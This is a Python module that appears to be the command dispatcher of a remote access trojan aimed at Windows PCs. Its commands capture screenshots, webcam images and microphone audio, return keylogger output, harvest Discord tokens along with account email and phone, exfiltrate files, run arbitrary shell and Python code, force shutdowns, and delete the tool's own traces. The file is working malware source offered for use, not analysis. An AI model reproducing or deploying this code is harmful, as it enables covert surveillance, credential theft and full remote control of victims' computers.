import os
import datetime
import typing
import multiprocessing
import json
import sys
from . import fs
from .command_result import CommandResult
from .config import get_config, get_folder, FEATURE_KEYLOGGER_ENABLED
from .microphone import record_microphone
from .config import SYSTEM_OK_STATUS_CODE, VERSION
from .tags import get_tags, save_tags, set_tags
from .utils import get_ip
from .name import set_name, get_name, save_name
from .discord import discord_request_profile, discord_get_tokens
from .drives import drives_watching_terminate
from .autorun import autorun_unregister
from .keylogger import get_keylogger_buffer


def command_name_new(arguments, _) -> CommandResult:
    """ Сommand `name_new` that changes name to other."""

    if len(arguments) > 0:
        # If correct arguments.

        # Changing name.
        set_name(arguments)
        save_name()
        return CommandResult(f"Name was changed to {get_name()}")
    return CommandResult("Invalid new name!")


def command_microphone(arguments, _) -> CommandResult:
    """ Command `microphone` that records voice and sends it. """

    try:
        import pyaudio  # pylint: disable=import-outside-toplevel
        import wave  # pylint: disable=import-outside-toplevel
    except ImportError:
        return CommandResult("This command does not supported on selected PC! (pyaduio/wave module is not installed)")

    path = get_folder() + get_config()["paths"]["microphone"]

    try:
        record_microphone(path, int(arguments))
    except ValueError:
        record_microphone(path)


    result = CommandResult()
    result.from_attachment(path, "Microphone", "audio_message")
    return result


def command_webcam(_arguments, _event) -> CommandResult:
    """ Command `webcam` that returns webcam photo. """

    try:
        import cv2  # pylint: disable=import-outside-toplevel
    except ImportError:
        return CommandResult(
            "This command does not supported on selected PC! (opencv-python (CV2) module is not installed)")

    camera = cv2.VideoCapture(0)
    _, image = camera.read()

    path = get_folder() + get_config()["paths"]["webcam"]
    fs.build_path(path)
    cv2.imwrite(path, image)

    del camera

    result = CommandResult()
    result.from_attachment(path, "Webcam", "photo")
    return result


def command_screenshot(*_) -> CommandResult:
    """ Command `screenshot` that returns screenshot image. """

    try:
        import PIL.ImageGrab  # pylint: disable=import-outside-toplevel
    except ImportError:
        return CommandResult("This command does not supported on selected PC! (Pillow module is not installed)")

    # Taking screenshot.
    screenshot = PIL.ImageGrab.grab()

    path = get_folder() + get_config()["paths"]["screenshot"]
    screenshot.save(path)

    result = CommandResult()
    result.from_attachment(path, "Screenshot", "photo")
    return result


def command_download(arguments, _) -> CommandResult:
    """ Command `download` that downloads file from client."""

    # Get download path.
    path = arguments.replace("\"", "").replace("\'", "")

    if os.path.exists(path):
        if os.path.isfile(path):
            if fs.get_size(path) < 1536:
                result = CommandResult()
                result.from_attachment(path, os.path.basename(path), "doc")
                result.disable_delete_after_uploading()
                return result
            return CommandResult("Too big file to download! Maximal size for download: 1536MB (1.5GB)")
        
        if os.path.isdir(path):
            if fs.get_size(path) < 1536:
                return CommandResult("Directories downloading is not implemented yet!")
            return CommandResult("Too big directory to download! Maximal size for download: 1536MB(1.5GB)")
    else:
        if os.path.exists(get_folder() + path):
            return command_download(get_folder() + path, _)
    return CommandResult("Path that you want download does not exists")


def command_drives(*_) -> CommandResult:
    """ Command `drives` that returns list of all drives in the system. """
    return CommandResult("Drives: \n" + "Drive: ,\n".join(fs.try_get_drives_list()))


def command_taskkill(arguments, _) -> CommandResult:
    """ Command `taskkill` that kills task. """

    console_response = os.system(f"taskkill /F /IM {arguments}")
    if console_response == SYSTEM_OK_STATUS_CODE:
        return CommandResult("Task successfully killed!")

    return CommandResult(f"Unable to kill task, there is some error? (Non-zero exit code {console_response})")


def command_upload(*_) -> CommandResult:
    """ Command `upload` that uploads file to the client. """
    return CommandResult("Not implemented yet!")


def command_version(*_) -> CommandResult:
    """ Command `version` that returns version """
    return CommandResult(VERSION)


def command_tags(*_) -> CommandResult:
    """ Command tags that returns tags list. """
    return CommandResult(str("Tag: ,\n".join(get_tags())))


def command_console(arguments, _) -> CommandResult:
    """ Command `console` that executing console. """
    console_response = os.system(arguments)
    if console_response == SYSTEM_OK_STATUS_CODE:
        return CommandResult(f"Console status code: OK (Exit code {console_response})")

    return CommandResult(f"Console status code: ERROR (Non-zero exit code {console_response})")


def command_restart(*_) -> CommandResult:
    """ Command `restart` that restarts system. """
    os.system("shutdown /r /t 0")
    return CommandResult("Restarting system (`shutdown /r /t 0`)...")


def command_alive(*_) -> CommandResult:
    """ Command `alive` that show current time. """

    current_time = datetime.datetime.now().strftime("%H:%M:%S")
    return CommandResult(f"Alive! Time: {current_time}")


def command_shutdown(*_) -> CommandResult:
    """ Command `shutdown` that shutdown system. """

    os.system("shutdown /s /t 0")
    return CommandResult("Shutdowning system (`shutdown /s /t 0`)...")


def command_location(*_) -> CommandResult:
    """ Command `location` that returns location based on IP. """

    # Getting ip data.
    ip_data = get_ip()

    if all(key in ip_data for key in ("ip", "city", "country", "region", "org")):
        # If all required fields exists.

        # Getting ip data.
        address = ip_data["ip"]
        city = ip_data["city"]
        country = ip_data["country"]
        region = ip_data["region"]
        provider = ip_data["org"]

        # Returning.
        return CommandResult(
            f"IP: {address},\n"
            f"Country: {country},\n"
            f"Region: {region},\n"
            f"City: {city},\n"
            f"Provider: {provider}."
        )

    # Error.
    return CommandResult("Couldn't get location from IP data")


def command_properties(arguments, _) -> CommandResult:
    """ Command `properties` that returns properties of the file. """

    # Get download path.
    path = arguments.replace("\"", "").replace("\'", "")

    if os.path.exists(path):
        # If path exists.

        # Getting size.
        property_size = f"{fs.get_size(path)}MB"

        # Getting type.
        property_type = fs.get_type(path)

        # Getting time properties.
        property_created_at = datetime.date.fromtimestamp(os.path.getctime(path))
        property_accessed_at = datetime.date.fromtimestamp(os.path.getatime(path))
        property_modified_at = datetime.date.fromtimestamp(os.path.getmtime(path))

        # Returning properties.
        return CommandResult(
            f"Path: {path},\n"
            f"Size: {property_size},\n"
            f"Type: {property_type},\n"
            f"Modified: {property_modified_at},\n"
            f"Created: {property_created_at},\n"
            f"Accessed: {property_accessed_at}."
        )

    # If not exists.

    if os.path.exists(get_folder() + path):
        # Try relative.

        # Call for relative.
        return command_properties(get_folder() + path, _)

    return CommandResult("Path does not exists!")


def command_message(arguments: str, _) -> CommandResult:
    """ Command `message` that shows message. """

    try:
        import ctypes  # pylint: disable=import-outside-toplevel
    except ImportError:
        return CommandResult("This command does not supported on selected PC! (ctypes module is not installed)")

    if (arguments_list := arguments.split(";")) and len(arguments_list) == 0:
        return CommandResult("Incorrect arguments! Example: text;title;style")

    # Calling message.
    try:
        # Trying to show message.

        # Arguments check ([text: str, title: str, type: int])
        message_parameters: typing.List[typing.Union[str, int]] = arguments_list

        # Process optional parameters.
        if len(arguments_list) <= 0:
            message_parameters.append("")  # Text.
        if len(arguments_list) <= 1:
            message_parameters.append("")  # Title.
        if len(arguments_list) <= 2:
            message_parameters.append(0)  # Type.

        # Convert type argument to integer.
        message_parameters[2] = int(message_parameters[2])

        # Creating thread.
        multiprocessing.Process(
            # First argument, is hWND. That is not required.
            target=ctypes.windll.user32.MessageBoxW,
            args=(0, *message_parameters)
        ).start()

    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        return CommandResult(f"Error when showing message! Error: {exception}")
    return CommandResult("Message was shown!")


def command_tags_new(arguments, _) -> CommandResult:
    """ Command `tags_new` that replaces tags. """

    if (arguments := arguments.split(";")) and len(arguments) == 0:
        # If no arguments.
        return CommandResult("Incorrect arguments! Example: (tags separated by ;)")

    # Tags that was added.
    new_tags = list({tag.replace(" ", "-") for tag in arguments})

    if len(new_tags) != 0:
        # If tags was added.

        set_tags(new_tags)
        save_tags()

        return CommandResult(f"Tags was replaced to: {';'.join(get_tags())}")
    return CommandResult("Tags replacing was not completed! No valid tags passed!")


def command_tags_add(arguments: str, _) -> CommandResult:
    """ Command `tags_add` that adds tags to current. """

    if (arguments_list := arguments.split(";")) and len(arguments_list) == 0:
        # If no arguments.
        return CommandResult("Incorrect tags arguments! Example: (tags separated by ;)")

    # Clean tags.
    tags = [tag.replace(" ", "-") for tag in arguments_list]

    set_tags(get_tags().extend(tags))
    save_tags()
    return CommandResult(f"Added new tags: {';'.join(tags)}. Now tags is: {';'.join(get_tags())}")


def command_help(arguments, _event) -> CommandResult:
    """ Command `help` that shows help for all commands. """

    # Getting arguments.
    arguments = arguments.split(";")

    if len(arguments) > 0 and arguments[0] != "":
        # If command given.

        # Getting command.
        command = arguments[0]

        if command not in _command_help:
            return CommandResult(f"Command {command} not exists!")

        # Help information.
        information, using = _command_help[command]

        # Returning information.
        return CommandResult(
            f"[{command}]:\n"
            f"* {information}\n"
            f"* (Use: {using})"
        )

    # Help string.
    help_string = ""

    for command, information in _command_help.items():
        # For all commands and they information.

        # Decompose information.
        information, using = information

        # Add data.
        help_string += f"[{command}]: \n" \
                       f"--{information}\n" \
                       f"-- (Use: {using})\n"

    # Returning.
    return CommandResult(help_string)


def command_discord_profile(*_) -> CommandResult:
    """ Command `discord_profile` that returns information about Discord found in system ,(comma)."""

    tokens = discord_get_tokens()

    if len(tokens) == 0:
        return CommandResult("Discord tokens was not found in system!")

    profile = discord_request_profile(tokens)

    if profile:
        if avatar := None and ("avatar" in profile and profile["avatar"]):
            # TODO: Why there is some of IDs?.
            avatar = "\n\n" + f"https://cdn.discordapp.com/avatars/636928558203273216/{profile['avatar']}.png"
        return CommandResult(
            f"[ID{profile['id']}]\n[{profile['email']}]\n[{profile['phone']}]\n{profile['username']}" +
            avatar if avatar else ""
        )

    return CommandResult("Failed to get Discord profile!")


def command_keylog(*_) -> CommandResult:
    """ Command `keylog` that shows current keylog buffer."""

    if not FEATURE_KEYLOGGER_ENABLED:
        return CommandResult("Keylogger is disabled!")

    return CommandResult(get_keylogger_buffer())


def command_ls(arguments, _) -> CommandResult:
    """ Command `ls` that lists all files in the directory. """

    # Get directory.
    directory_path = arguments if arguments != "" else _cwd

    # Get files.
    directory_list = fs.try_listdir(directory_path)
    directory_items = ",\n".join([
        ("[D] " + path if os.path.isdir(directory_path + "\\" + path) else "[F] " + path) for path in directory_list
    ]) if directory_list else "Empty (Or error)!"

    # Returning.
    return CommandResult(f"Directory `{directory_path}`:\n" + directory_items)


def command_link(arguments, _) -> CommandResult:
    """ Command `link` that opens link."""

    # Get arguments.
    arguments = arguments.split(";")

    # Open with module or not.
    native = False
    if len(arguments) > 1 and arguments[1] == "native":
        native = True

    if not native:
        # If not native mode .

        try:
            # Trying to open with the module.
            import webbrowser  # noqa, pylint: disable=import-outside-toplevel
            webbrowser.open(arguments[0])
            return CommandResult("Link was opened (Via module)!")
        except ImportError:
            pass

    # Opening with system.
    console_response = os.system(f"start {arguments[0]}")

    if console_response == SYSTEM_OK_STATUS_CODE:
        return CommandResult("Link was opened (Via system, native)!")
    return CommandResult(f"Link was not opened! (Non-zero exit code {console_response})")


def command_ddos(arguments, _) -> CommandResult:
    """ Command `ddos` that start ddos. """

    # Getting arguments.
    arguments = arguments.split(";")

    if len(arguments) >= 1:
        # If arguments OK.

        # Get address.
        address = arguments[0]

        if len(arguments) > 2 and arguments[2] == "admin":
            # If admin.

            # Get timeout.
            timeout = arguments[1]

            # Pinging from admin.
            console_response = os.system(f"ping -c {address} {timeout}")

            if console_response == SYSTEM_OK_STATUS_CODE:
                return CommandResult("Completed DDoS (Admin)")

            return CommandResult(f"DDoS ping returned non-zero exit code {console_response}! (Admin) (Access Denied?)")

        # Pinging from user.
        console_response = os.system(f"ping {address}")

        if console_response == SYSTEM_OK_STATUS_CODE:
            return CommandResult("Completed DDoS (User)")

        return CommandResult(f"DDoS ping returned non-zero status {console_response}! (User)")

    return CommandResult("DDoS incorrect arguments! Example: address;time;admin or address")


def command_python(arguments, _) -> CommandResult:
    """ Command `python` that executes python code. """

    global _out  # pylint: disable=global-variable-not-assigned
    _out = None

    python_source_code = arguments.\
        replace("&gt;", ">").\
        replace("&lt;", "<").\
        replace("&quot;", "'").\
        replace("&tab", "   ")

    try:
        exec(python_source_code, globals(), locals())  # pylint: disable=exec-used
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        return CommandResult(f"Python code execution exception: {exception}")

    if _out is not None:
        try:
            return CommandResult(str(_out))
        except NameError:
            pass

    return CommandResult("Python code does not return output! Write in _out variable.")


def command_discord_profile_raw(*_) -> CommandResult:
    """ Сommand "discord_profile_raw" that returns information about discord found in system (as raw dict). """

    tokens = discord_get_tokens()
    if len(tokens) == 0:
        return CommandResult("Discord tokens not found in system!")

    profile = discord_request_profile(tokens)
    if profile:
        return CommandResult(json.dumps(profile, indent=2))
        
    return CommandResult("Discord profile not found (Failed to load)")


def command_discord_tokens(*_) -> CommandResult:
    """ Command "discord_tokens" that returns list of the all discord tokens founded in system ,(comma). """

    tokens = discord_get_tokens()
    if len(tokens) == 0:
        return CommandResult("Discord tokens was not found in system!")

    return CommandResult("Discord tokens:\n" + ",\n".join(tokens))


def command_destruct(*_) -> CommandResult:
    """ Command `destruct` that deletes self from system. """

    autorun_unregister()

    fs.try_delete(get_folder() + "lock")
    fs.try_delete(get_folder() + get_config()["paths"]["tags"])
    fs.try_delete(get_folder() + get_config()["paths"]["name"])
    fs.try_delete(get_folder() + get_config()["paths"]["log"])
    fs.try_delete(get_folder() + get_config()["paths"]["anchor"])
    fs.try_delete(get_folder() + get_config()["paths"]["screenshot"])
    fs.try_delete(get_folder() + get_config()["paths"]["microphone"])
    fs.try_delete(get_folder() + get_config()["paths"]["webcam"])
    fs.try_delete(get_folder() + get_config()["autorun"]["executable"])
    fs.try_delete(get_folder())

    return command_exit(*_)


def command_exit(*_) -> CommandResult:
    """ Command `exit` that exists app. """
    from .server import server_message
    drives_watching_terminate()
    server_message("Exiting...")
    sys.exit(0)
    return CommandResult("Exiting...")  # noqa


def command_cd(arguments, _) -> CommandResult:
    """ Command `cd` that changes directory. """

    global _cwd
    # Get directory path.
    path = arguments

    # Remove trailing slash.
    if path.endswith("\\"):
        path = path[:-1]

    if path.startswith(".."):
        # If go up.

        # Get directory elements.
        path_directories = _cwd.split("\\")

        if len(path_directories) == 1:
            # If last (like C:\\)

            # Error.
            return CommandResult("Already in root! Directory: " + _cwd)

        # Remove last.
        path_directories.pop(-1)

        if len(path_directories) <= 1:
            # If last (like C:\\)

            # Valid.
            path_directories.append("")

        # Pass path to next cd command.
        path = "\\".join(path_directories)
        return command_cd(path, _)

    if os.path.exists(_cwd + "\\" + path):
        # If this is local folder.

        if not os.path.isdir(_cwd + "\\" + path):
            # If not directory.
            return CommandResult("Can`t change directory to the filename")

        # Changing.
        _cwd += "\\" + path

        return CommandResult(f"Changed directory to {_cwd}")

    # If not local path.
    if os.path.exists(path):
        # If path exists - moving there.

        if not os.path.isdir(path):
            # If not directory.
            return CommandResult("Can`t change directory to the filename")

        if path == "":
            # If no arguments.
            return CommandResult(f"Current directory - {_cwd}")

        # Changing.
        _cwd = path

        return CommandResult(f"Changed directory to {_cwd}")

    return CommandResult(f"Directory {path} does not exists!")


def execute_command(command_name: str, arguments: str, event) -> CommandResult:
    """ Function that executes command and return it result. """
    for command, function in _command_functions.items():
        if command_name == command:
            result: CommandResult = function(arguments, event)
            return result
    return CommandResult(f"Invalid command {command_name}! Write `help` command to get all commands!")


_cwd = os.getcwd()  # for directory command.
_out = None # `python` command output container.


_command_functions = {
    "screenshot": command_screenshot,
    "webcam": command_webcam,
    "microphone": command_microphone,
    "help": command_help,
    "version": command_version,
    "tags": command_tags,
    "location": command_location,
    "keylog": command_keylog,
    "taskkill": command_taskkill,
    "cd": command_cd,
    "ls": command_ls,
    "drives": command_drives,
    "discord_tokens": command_discord_tokens,
    "discord_profile": command_discord_profile,
    "discord_profile_raw": command_discord_profile_raw,
    "tags_new": command_tags_new,
    "tags_add": command_tags_add,
    "shutdown": command_shutdown,
    "restart": command_restart,
    "console": command_console,
    "upload": command_upload,
    "ddos": command_ddos,
    "link": command_link,
    "name_new": command_name_new,
    "exit": command_exit,
    "python": command_python,
    "message": command_message,
    "destruct": command_destruct,
    "download": command_download,
    "properties": command_properties,
    "alive": command_alive
}


_command_help = {
    "discord_profile_raw": (
        "Returns you all RAW (as dict (JSON)) information about client Discord profile",
        "discord_profile_raw"
    ),
    "discord_tokens": (
        "Returns you all found Discord tokens in client system",
        "discord_tokens"
    ),
    "discord_profile": (
        "Returns you all information about client Discord profile",
        "discord_profile"
    ),
    "download": (
        "Downloads file from the client client.",
        "download [required]PATH"
    ),
    "screenshot": (
        "Returns you an photo (screenshot) from screen of the client.",
        "screenshot"
    ),
    "webcam": (
        "Returns you an photo from webcam of the client (Only if it connected to the PC).",
        "webcam"
    ),
    "microphone": (
        "Returns you an voice message from microphone of the client, "
        "for that amount of the seconds that you specify (Only if it connected to the PC).",
        "microphone [optional, default is 1]SECONDS"
    ),
    "help": (
        "Returns list of the all commands in the app, "
        "if you specify command, shows documentation to given command itself.",
        "help [optional]COMMAND"
    ),
    "version": (
        "Returns current version of the app instance that is currently running on the client PC "
        "(That is get this command).",
        "version"
    ),
    "tags": (
        "Returns an list separated by ,(comma) of the all tags that have called instance of the app.",
        "tags"
    ),
    "location": (
        "Returns location (fully not very precise) of the client (Gets throughout IP).", "location"
    ),
    "keylog": (
        "Returns log of the keylogger.",
        "keylog"
    ),
    "cd": (
        "Changes directory of the files commands, if you don't specify directory, this will show it"
        "(Write only name of directory in current directory or full path itself).",
        "cd [optional]DIRECTORY"
    ),
    "ls": (
        "Returns list of the files in current directory (Or directory that you specify) separated by ,(comma).",
        "ls"
    ),
    "drives": (
        "Returns list of the all drives in the system separated by ,(comma)",
        "drives"
    ),
    "tags_new": (
        "Replaces all old tags with these new.",
        "tags_new [required]TAGS(Separated by;)"
    ),
    "tags_add": (
        "Adds given tags to all other tags.",
        "tags_add [required]TAGS(Separated by ;)"
    ),
    "shutdown": (
        "Shutdowns client PC.",
        "shutdown"
    ),
    "restart": (
        "Restarts client PC.",
        "restart"
    ),
    "console": (
        "Executes console command and returns it code (0 if all OK)",
        "console"
    ),
    "ddos": (
        "Pings given address",
        "ddos [required]ADDRESS"
    ),
    "link": (
        "Opens link in a client browser.",
        "link [required]URI"
    ),
    "name_new": (
        "Replaces old name with this name",
        "name_new [required]NAME"
    ),
    "exit": (
        "Exits app (Will be launched when PC is restarted)",
        "exit"
    ),
    "python": (
        "Executes python code, if you want to get output write - global OUT "
        "OUT = \"Hello World!\" and this is gonna be shown.",
        "python [required]CODE"
    ),
    "message": (
        "Shows message to the user. (Styles - from 0 to 6, changes buttons)",
        "message [required]TEXT;TITLE[optional];STYLE[optional]"
    ),
    "destruct": (
        "Delete app from the system (Removing from the autorun and closing)",
        "destruct"
    ),
    "alive": (
        "Shows current time",
        "alive"
    )
}




